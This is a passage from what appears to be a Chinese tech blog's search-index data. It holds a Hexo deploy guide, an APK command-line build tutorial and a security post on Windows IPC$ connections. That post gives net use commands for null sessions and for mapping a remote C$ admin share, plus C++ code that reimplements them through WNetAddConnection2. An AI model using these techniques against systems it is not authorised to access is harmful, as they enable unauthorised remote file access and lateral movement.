class=\"string\">main</span></span><br></pre></td></tr></table></figure>\n\n<p>Hexo安装Git部署插件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>\n\n<p>设置git信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">&quot;Your Name&quot;</span></span><br><span class=\"line\">git config --global user.email <span class=\"string\">&quot;you@example.com&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>开始部署：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean </span><br><span class=\"line\">hexo g </span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure>","categories":["Util"],"tags":["Web"]},{"title":"IPC连接","url":"/IpcConnection/","content":"<h1 id=\"IPC连接\"><a href=\"#IPC连接\" class=\"headerlink\" title=\"IPC连接\"></a>IPC连接</h1><h2 id=\"0x1-介绍\"><a href=\"#0x1-介绍\" class=\"headerlink\" title=\"0x1 介绍\"></a>0x1 介绍</h2><p><code>IPC</code>是<code>Internet Process Connection</code>的缩写，也就是远程网络连接。它是<code>Windows NT/2000/XP</code>特有的一项功能，就是在两个计算机进程之间建立通信连接。</p>\n<span id=\"more\"></span>\n\n<ul>\n<li><p>建立IPC连接要求双方都是基于NT架构的系统。Windows Me/98/95都不可以。</p>\n</li>\n<li><p>发起IPC$和被建立IPC$是两个不同的概念。别人无法和自己建立IPC$并不影响自己是否能够和他人建立IPC$。</p>\n</li>\n<li><p>空连接和IPC$是不同的概念。空连接是在没有信任的情况下与服务器建立的会话，换句话说，它是一个到服务器的匿名访问。IPC$是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限。IPC$连接可以实现远程登陆及对默认共享的访问。</p>\n</li>\n<li><p>139、445端口开放了未必可以建立IPC$，但IPC$可建立则表示对方的139端口或445端口开放了。</p>\n</li>\n</ul>\n<h2 id=\"0x2-IPC使用\"><a href=\"#0x2-IPC使用\" class=\"headerlink\" title=\"0x2 IPC使用\"></a>0x2 IPC使用</h2><ul>\n<li>空连接</li>\n</ul>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.28.128\\ipc$ &quot;&quot; /user:&quot;&quot;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<ul>\n<li>密码连接</li>\n</ul>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;net use \\\\192.168.28.128\\ipc$ &quot;password&quot; /user:&quot;username&quot;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<ul>\n<li>映射路径</li>\n</ul>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use z: \\\\192.168.28.128\\c$ &quot;密码&quot; /user:&quot;用户名&quot;  (即可将对方的c盘映射为自己的z盘，其他盘类推)</span><br></pre></td></tr></table></figure>\n</blockquote>\n<ul>\n<li>删除连接</li>\n</ul>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.28.128\\ipc$ /del</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h2 id=\"0x3-IPC连接实现\"><a href=\"#0x3-IPC连接实现\" class=\"headerlink\" title=\"0x3 IPC连接实现\"></a>0x3 IPC连接实现</h2><p>因为不能直接调用外部net.exe程序，需要自己调用WIn32 API来实现IPC连接的功能</p>\n<p>首先我们需要找到IPC连接的API，网上的文章基本都是讲怎么用的，所以需要简单逆向一下自带的net.exe程序，路径在<code>C:\\windows\\system32</code></p>\n<p>微软的程序一般都不会加壳加混淆，估计微软也不屑于这么做。这里直接用CFF Explorer来打开程序，直接看导入表。导入的函数不算多，简单看一看就猜测出能与远程电脑建立连接必然和网络函数有关系，这里就直接定位到了MPR.dll中的几个API</p>\n<p><img src=\"1.png\"></p>\n<p>再去Google一下这几个API，确实是IPC管道连接的调用函数</p>\n<ul>\n<li>WNetAddConnection2 建立IPC管道连接</li>\n<li>WNetCancelConnection2 取消已经建立的IPC管道连接</li>\n<li>WNetEnumResource 枚举已经创建的IPC连接</li>\n</ul>\n<h2 id=\"0x4-代码实现\"><a href=\"#0x4-代码实现\" class=\"headerlink\" title=\"0x4 代码实现\"></a>0x4 代码实现</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">IpcAdd</span><span class=\"params\">(_TCHAR* servername, _TCHAR* username, _TCHAR* passwd)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    DWORD dwRetVal;</span><br><span class=\"line\">    NETRESOURCE nr;</span><br><span class=\"line\">    DWORD dwFlags;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Zero out the NETRESOURCE struct</span></span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(&amp;nr, <span class=\"number\">0</span>, <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(NETRESOURCE));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Assign our values to the NETRESOURCE structure.</span></span><br><span class=\"line\">    nr.dwType = RESOURCETYPE_ANY;</span><br><span class=\"line\">    nr.lpLocalName = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    nr.lpRemoteName = servername;</span><br><span class=\"line\">    nr.lpProvider = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Assign a value to the connection options</span></span><br><span class=\"line\">    dwFlags = CONNECT_UPDATE_PROFILE;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// Call the WNetAddConnection2 function to assign</span></span><br><span class=\"line\">    <span class=\"comment\">//   a drive letter to the share.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    dwRetVal = <span class=\"built_in\">WNetAddConnection2</span>(&amp;nr, passwd, username, dwFlags);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// If the call succeeds, inform the user; otherwise,</span></span><br><span class=\"line\">    <span class=\"comment\">//  print the error.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dwRetVal == NO_ERROR)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        _tprintf(_T(<span class=\"string\">&quot;[+] Connection added to %s\\r\\n&quot;</span>), nr.lpRemoteName);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> NO_ERROR;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        _tprintf(_T(<span class=\"string\">&quot;[-] WNetAddConnection2 failed with error: %u\\r\\n&quot;</span>), dwRetVal);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> dwRetVal;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">IpcDel</span><span class=\"params\">(_TCHAR* servername)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    DWORD dwResult;</span><br><span class=\"line\">    dwResult = <span class=\"built_in\">WNetCancelConnection2</span>(</span><br><span class=\"line\">        servername,</span><br><span class=\"line\">        CONNECT_UPDATE_PROFILE, <span class=\"comment\">// remove connection from profile </span></span><br><span class=\"line\">        FALSE);                 <span class=\"comment\">// fail if open files or jobs </span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Process errors.</span></span><br><span class=\"line\">    <span class=\"comment\">//  The device is not a local redirected device.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dwResult == ERROR_NOT_CONNECTED)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        _tprintf(_T(<span class=\"string\">&quot;[-] WNetCancelConnection2 failed: not connected\\r\\n&quot;</span>));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> dwResult;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Call an application-defined error handler.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (dwResult != NO_ERROR)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        _tprintf(_T(<span class=\"string\">&quot;[-] WNetCancelConnection2 failed\\r\\n&quot;</span>));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> dwResult;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//_tprintf(_T(&quot;[+] IPC connect close success\\r\\n&quot;));</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> NO_ERROR;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DisplayStruct</span><span class=\"params\">(<span class=\"keyword\">int</span>, LPNETRESOURCE)</span></span>;</span><br><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">IpcEnum</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    DWORD dwResult, dwResultEnum;</span><br><span class=\"line\">    HANDLE hEnum;</span><br><span class=\"line\">    DWORD cbBuffer = <span class=\"number\">16384</span>;     <span class=\"comment\">// 16K is a good size</span></span><br><span class=\"line\">    DWORD cEntries = <span class=\"number\">-1</span>;        <span class=\"comment\">// enumerate all possible entries</span></span><br><span class=\"line\">    LPNETRESOURCE lpnrLocal;    <span class=\"comment\">// pointer to enumerated structures</span></span><br><span class=\"line\">    DWORD i;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// Call the WNetOpenEnum function to begin the enumeration.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    dwResult = <span class=\"built_in\">WNetOpenEnum</span>(</span><br><span class=\"line\">        RESOURCE_CONNECTED, <span class=\"comment\">// all network resources</span></span><br><span class=\"line\">        RESOURCETYPE_ANY,   <span class=\"comment\">// all resources</span></span><br><span class=\"line\">        <span class=\"number\">0</span>,     <span class=\"comment\">// enumerate all resources</span></span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,       <span class=\"comment\">// NULL first time the function is called</span></span><br><span class=\"line\">        &amp;hEnum);    <span class=\"comment\">// handle to the resource</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dwResult != NO_ERROR) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;WnetOpenEnum failed with error %d\\n&quot;</span>, dwResult);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// Call the GlobalAlloc function to allocate resources.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    lpnrLocal = (LPNETRESOURCE)<span class=\"built_in\">GlobalAlloc</span>(GPTR, cbBuffer);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (lpnrLocal == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;WnetOpenEnum failed with error %d\\n&quot;</span>, dwResult);</span><br><span class=\"line\">        <span class=\"comment\">//      NetErrorHandler(hwnd, dwResult, (LPSTR)&quot;WNetOpenEnum&quot;);</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        <span class=\"comment\">// Initialize the buffer.</span></span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        <span class=\"built_in\">ZeroMemory</span>(lpnrLocal, cbBuffer);</span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        <span class=\"comment\">// Call the WNetEnumResource function to continue</span></span><br><span class=\"line\">        <span class=\"comment\">//  the enumeration.</span></span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        dwResultEnum = <span class=\"built_in\">WNetEnumResource</span>(hEnum,  <span class=\"comment\">// resource handle</span></span><br><span class=\"line\">            &amp;cEntries,      <span class=\"comment\">// defined locally as -1</span></span><br><span class=\"line\">            lpnrLocal,      <span class=\"comment\">// LPNETRESOURCE</span></span><br><span class=\"line\">            &amp;cbBuffer);     <span class=\"comment\">// buffer size</span></span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        <span class=\"comment\">// If the call succeeds, loop through the structures.</span></span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (dwResultEnum == NO_ERROR) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; cEntries; i++) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// Call an application-defined function to</span></span><br><span class=\"line\">                <span class=\"comment\">//  display the contents of the NETRESOURCE structures.</span></span><br><span class=\"line\">                <span class=\"comment\">//</span></span><br><span class=\"line\">                <span class=\"built_in\">DisplayStruct</span>(i, &amp;lpnrLocal[i]);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// If the NETRESOURCE structure represents a container resource, </span></span><br><span class=\"line\">                <span class=\"comment\">//  call the EnumerateFunc function recursively.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//if (RESOURCEUSAGE_CONTAINER == (lpnrLocal[i].dwUsage</span></span><br><span class=\"line\">                <span class=\"comment\">//    &amp; RESOURCEUSAGE_CONTAINER))</span></span><br><span class=\"line\">                <span class=\"comment\">//    //          if(!EnumerateFunc(hwnd, hdc, &amp;lpnrLocal[i]))</span></span><br><span class=\"line\">                <span class=\"comment\">//    if (!EnumerateFunc(&amp;lpnrLocal[i]))</span></span><br><span class=\"line\">                <span class=\"comment\">//        printf(&quot;EnumerateFunc returned FALSE\\n&quot;);</span></span><br><span class=\"line\">                <span class=\"comment\">////            TextOut(hdc, 10, 10, &quot;EnumerateFunc returned FALSE.&quot;, 29);</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// Process errors.</span></span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (dwResultEnum != ERROR_NO_MORE_ITEMS) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;WNetEnumResource failed with error %d\\n&quot;</span>, dwResultEnum);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//      NetErrorHandler(hwnd, dwResultEnum, (LPSTR)&quot;WNetEnumResource&quot;);</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// End do.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (dwResultEnum != ERROR_NO_MORE_ITEMS);</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// Call the GlobalFree function to free the memory.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">GlobalFree</span>((HGLOBAL)lpnrLocal);</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// Call WNetCloseEnum to end the enumeration.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    dwResult = <span class=\"built_in\">WNetCloseEnum</span>(hEnum);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dwResult != NO_ERROR) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        <span class=\"comment\">// Process errors.</span></span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;WNetCloseEnum failed with error %d\\n&quot;</span>, dwResult);</span><br><span class=\"line\">        <span class=\"comment\">//    NetErrorHandler(hwnd, dwResult, (LPSTR)&quot;WNetCloseEnum&quot;);</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DisplayStruct</span><span class=\"params\">(<span class=\"keyword\">int</span> i, LPNETRESOURCE lpnrLocal)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;NETRESOURCE[%d] Scope: &quot;</span>, i);</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">switch</span></span> (lpnrLocal-&gt;dwScope) &#123;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">case</span></span> (RESOURCE_CONNECTED):</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;connected\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">case</span></span> (RESOURCE_GLOBALNET):</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;all resources\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">case</span></span> (RESOURCE_REMEMBERED):</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;remembered\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;unknown scope %d\\n&quot;</span>, lpnrLocal-&gt;dwScope);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;NETRESOURCE[%d] Type: &quot;</span>, i);</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">switch</span></span> (lpnrLocal-&gt;dwType) &#123;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">case</span></span> (RESOURCETYPE_ANY):</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;any\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">case</span></span> (RESOURCETYPE_DISK):</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;disk\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">case</span></span> (RESOURCETYPE_PRINT):</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;print\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;unknown type %d\\n&quot;</span>, lpnrLocal-&gt;dwType);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;NETRESOURCE[%d] DisplayType: &quot;</span>, i);</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">switch</span></span> (lpnrLocal-&gt;dwDisplayType) &#123;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">case</span></span> (RESOURCEDISPLAYTYPE_GENERIC):</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;generic\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">case</span></span> (RESOURCEDISPLAYTYPE_DOMAIN):</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;domain\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">case</span></span> (RESOURCEDISPLAYTYPE_SERVER):</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;server\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">case</span></span> (RESOURCEDISPLAYTYPE_SHARE):</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;share\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">case</span></span> (RESOURCEDISPLAYTYPE_FILE):</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;file\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">case</span></span> (RESOURCEDISPLAYTYPE_GROUP):</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;group\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">case</span></span> (RESOURCEDISPLAYTYPE_NETWORK):</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;network\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;unknown display type %d\\n&quot;</span>, lpnrLocal-&gt;dwDisplayType);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;NETRESOURCE[%d] Usage: 0x%x = &quot;</span>, i, lpnrLocal-&gt;dwUsage);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (lpnrLocal-&gt;dwUsage &amp; RESOURCEUSAGE_CONNECTABLE)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;connectable &quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (lpnrLocal-&gt;dwUsage &amp; RESOURCEUSAGE_CONTAINER)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;container &quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;NETRESOURCE[%d] Localname: %S\\n&quot;</span>, i, lpnrLocal-&gt;lpLocalName);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;NETRESOURCE[%d] Remotename: %S\\n&quot;</span>, i, lpnrLocal-&gt;lpRemoteName);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;NETRESOURCE[%d] Comment: %S\\n&quot;</span>, i, lpnrLocal-&gt;lpComment);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;NETRESOURCE[%d] Provider: %S\\n&quot;</span>, i, lpnrLocal-&gt;lpProvider);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><blockquote>\n<p><a href=\"https://blog.csdn.net/kwuwei/article/details/28910425\">https://blog.csdn.net/kwuwei/article/details/28910425</a></p>\n<p><a href=\"https://docs.microsoft.com/en-us/windows/win32/wnet/using-windows-networking\">https://docs.microsoft.com/en-us/windows/win32/wnet/using-windows-networking</a></p>\n</blockquote>\n","categories":["Security"],"tags":["windows"]},{"title":"命令行手动构建APK","url":"/Make_apk_from_command_line/","content":"<h2 id=\"0x01-介绍\"><a href=\"#0x01-介绍\" class=\"headerlink\" title=\"0x01 介绍\"></a>0x01 介绍</h2><p>通过使用Android studio提供的命令行工具，手动构建一个Android application package</p>\n<span id=\"more\"></span>\n\n<h2 id=\"0x02-环境搭建\"><a href=\"#0x02-环境搭建\" class=\"headerlink\" title=\"0x02 环境搭建\"></a>0x02 环境搭建</h2><p>这里使用的系统为Windows</p>\n<ul>\n<li>JDK8：在Orcle官网可以下载 <a href=\"https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html\">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></li>\n<li>Android SDK tools：<a href=\"https://developer.android.com/studio/index.html#downloads\">https://developer.android.com/studio/index.html#downloads</a></li>\n</ul>\n<p>也可以通过Android Studio下载安装</p>\n<p>工具介绍</p>\n<ul>\n<li>aapt：Android Asset Packaging Tool，Android资源打包工具</li>\n<li>dx：将jvm字节码文件(.class)转换成android虚拟机字节码文件(.dex)</li>\n<li>zipalign.exe：进行对齐处理，可以确保所有未压缩数据的开头均相对于文件开头执行特定的字节对齐，从而减少应用占用的 RAM 量。</li>\n</ul>\n<h2 id=\"0x03-APK文件结构\"><a href=\"#0x03-APK文件结构\" class=\"headerlink\" title=\"0x03 APK文件结构\"></a>0x03 APK文件结构</h2><p>APK (Android Package）文件，是一个后缀名为.apk的压缩文件，APK文件中包含了一个Android应用程序的所有内容，是Android平台用于安装应用程序的文件。APK就是一个zip压缩包，解开这个APK包我们可以看到以下的结构：</p>\n<pre><code>assets 存放需要打包到APK中的静态文件\nlib 存放应用程序所依赖的native库\nres 存放应用程序的资源文件\nMETA-INF 存放应用程序的签名和证书\nAndroidManifest.xml 应用程序配置文件\nclasses.dex dex可执行文件\nresources.arsc 资源索引表, 记录资源文件和资源ID之间的映射关系\n</code></pre>\n<h2 id=\"0x04-APK打包流程\"><a href=\"#0x04-APK打包流程\" class=\"headerlink\" title=\"0x04 APK打包流程\"></a>0x04 APK打包流程</h2><ul>\n<li>aapt阶段：aapt工具编译res资源文件，把大部分xml文件编译成二进制文件（图片文件除外），同时生成R.- Java文件和resources.arsc文件，里面保存了资源的ID和在APK中的路径。</li>\n<li>aidl阶段：如果项目中有使用AIDL，那么就会把.aidl文件编译成.java文件。</li>\n<li>javaCompiler阶段：将所有.java文件(包括R文件和AIDL生成的.java文件)，通过javac工具生成class文件。</li>\n<li>dex阶段：将生成的.class文件和第三方库的.class文件通过dx工具生成classes.dex文件(如果有分包，那么可能有多个)。</li>\n<li>apkBuilder阶段：aapt阶段中的资源文件、dex文件和第三方的非java资源包(.so)，通过apkbuilder工具生成未签名的apk包。</li>\n<li>jarSigner阶段：签名，jarsigner工具，v1签名。</li>\n<li>zipAligin阶段：对齐，通过zipalign工具对apk中的未压缩资源（图片、视频）进行“对齐操作”，让资源按4字节的边界进行对齐，使得资源访问速度更快。</li>\n<li>apksigner阶段：对v1签名的改进，v2签名</li>\n</ul>\n<h2 id=\"0x05-构建APK\"><a href=\"#0x05-构建APK\" class=\"headerlink\" title=\"0x05 构建APK\"></a>0x05 构建APK</h2><h3 id=\"创建工程\"><a href=\"#创建工程\" class=\"headerlink\" title=\"创建工程\"></a>创建工程</h3><p>创建Android application目录，名称为TestApplication</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> TestApplication</span><br><span class=\"line\"><span class=\"built_in\">cd</span> TestApplication</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> src\\com\\example\\myapplication</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> obj</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> bin</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> res\\layout</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> res\\values</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> res\\drawable</span><br></pre></td></tr></table></figure>\n\n<p>在src\\com\\example\\testapplication下创建一个java源码文件，内容如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.myapplication;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> android.app.Activity;</span><br><span class=\"line\"><span 